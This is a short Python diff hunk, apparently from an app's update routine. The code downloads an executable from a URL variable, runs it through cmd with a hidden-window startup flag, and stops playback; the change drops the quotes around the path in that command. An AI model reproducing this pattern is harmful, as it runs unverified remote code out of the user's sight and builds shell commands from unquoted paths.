@@ -49,7 +49,7 @@ try:
             urllib.request.urlretrieve(trlink, "setup.exe")
             si = subprocess.STARTUPINFO()
             si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            subprocess.call('start /b cmd /c "' + os.getcwd() + '\\setup.exe"', startupinfo=si)
+            subprocess.call('start /b cmd /c ' + os.getcwd() + '\\setup.exe', startupinfo=si)
             stopplayback()
 except requests.exceptions.ConnectionError:
     pass
